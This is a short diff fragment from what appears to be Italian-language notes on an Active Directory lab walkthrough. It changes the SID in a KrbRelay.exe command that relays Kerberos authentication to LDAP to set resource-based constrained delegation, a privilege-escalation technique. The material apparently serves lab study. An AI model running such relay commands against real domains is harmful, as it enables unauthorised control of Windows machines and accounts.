@@ -464,5 +464,5 @@ Ora carichiamo CheckPort.exe sulla macchine ed eseguiamolo
 ![[Pasted image 20230906142820.png]]
 Lanciamo KrbRelay.exe
 ```powershell
-.\KrbRelay.exe -spn ldap/winterfell.north.sevenkingdoms.local -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-3469228063-1577654746-3345322900-1127 -port 443
+.\KrbRelay.exe -spn ldap/winterfell.north.sevenkingdoms.local -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-585350295-1285882793-2068218167-5103 -port 443
 ```
